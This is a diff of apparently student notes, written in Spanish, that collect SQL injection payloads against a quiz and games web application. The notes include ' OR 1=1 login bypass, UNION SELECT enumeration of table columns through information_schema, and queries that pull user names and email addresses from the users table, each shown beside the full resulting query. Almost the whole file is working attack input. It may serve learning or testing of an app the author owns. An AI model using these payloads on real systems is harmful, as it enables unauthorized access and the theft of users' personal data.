@@ -5,22 +5,32 @@
 
 SELECT * from usuario where correo='' OR 1=1 -- ' && contraseña='';
 
--- en el formulario de buscar pregurta voy a scar todas la prenguntas en vez de una
-' OR 1=1 -- 
+-- en el formulario de buscar juegos voy a sacar todos los juegos en vez de uno
+' OR 1=1 #
 
-  SELECT * FROM preguntas WHERE titulo='' OR 1=1 -- '
+SELECT * FROM juego WHERE descripcion = '' OR 1=1 #'
 
 
--- voy a sacar la estrucctura de la tabla pregunta (La inyeccion las estoy sacando de la ia aponyandome para ver como saco vulnerabilidad)
-' UNION SELECT 
-1,
-concat('Columna: ',column_name,' | Tipo: ',data_type,' | Null: ',is_nullable),
-3,
-4,
-5,
-6
-FROM information_schema.columns
-WHERE table_name='preguntas' #
 
-  SELECT * FROM preguntas WHERE titulo='' UNION SELECT 1, concat('Columna: ',column_name,' | Tipo: ',data_type,' | Null: ',is_nullable), 3, 4, 5, 6 FROM information_schema.columns WHERE table_name='preguntas' #'
+-- voy a sacar la estrucctura de la tabla juego 
+' UNION SELECT 1, column_name, data_type, 0, 0, 0
+      FROM information_schema.columns
+            WHERE table_name = 'juego' #
+
+
+SELECT * FROM juego WHERE descripcion = '' UNION SELECT 1, column_name, data_type, 0, 0, 0 FROM information_schema.columns WHERE table_name = 'juego' #'
+
+-- sacar el gmail con el nombre de usuario a quien le pertenece 
+' UNION SELECT  idUsuario, nombre, email, 0, idUsuario, 0 FROM usuarios #
+
+  
+SELECT * FROM juego WHERE descripcion = '' UNION SELECT idUsuario, nombre, email, 0, idUsuario, 0 FROM usuarios #'
+
+-- voy a sacar los temas con su inforamcion
+
+' UNION SELECT idTema, nombre, abreviatura, publico, idUsuario, 0 FROM tema #
+
+
+SELECT * FROM juego WHERE descripcion = '' UNION SELECT idTema, nombre, abreviatura, publico, idUsuario, 0 FROM tema #'
+
 
